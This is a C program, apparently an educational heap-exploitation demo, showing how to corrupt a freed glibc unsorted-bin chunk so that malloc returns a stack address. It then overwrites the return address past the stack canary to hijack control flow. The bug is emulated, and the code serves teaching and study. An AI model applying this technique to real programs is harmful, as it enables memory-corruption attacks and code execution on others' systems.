#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

void jackpot(){ printf("Nice jump d00d\n"); exit(0); }

int main() {
	setbuf(stdout, NULL);
	intptr_t stack_buffer[4] = {0};

	printf("This technique only works with disabled tcache-option for glibc or the size of the victim chunk is larger than 0x408, see build_glibc.sh for build instructions.\n");

	printf("Allocating the victim chunk\n");
	intptr_t* victim = malloc(0x410);

	printf("Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
	intptr_t* p1 = malloc(0x410);

	printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
	free(victim);

	printf("Create a fake chunk on the stack");
	printf("Set size for next allocation and the bk pointer to any writable address");
	stack_buffer[1] = 0x410 + 0x10;
	stack_buffer[3] = (intptr_t)stack_buffer;

	//------------VULNERABILITY-----------
	printf("Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
	printf("Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
	victim[-1] = 0x30;
	victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
	//------------------------------------

	printf("Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
	char *p2 = malloc(0x410);
	printf("malloc(0x410): %p\n", p2);

	intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
	memcpy((p2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

	assert((long)__builtin_return_address(0) == (long)jackpot);
}
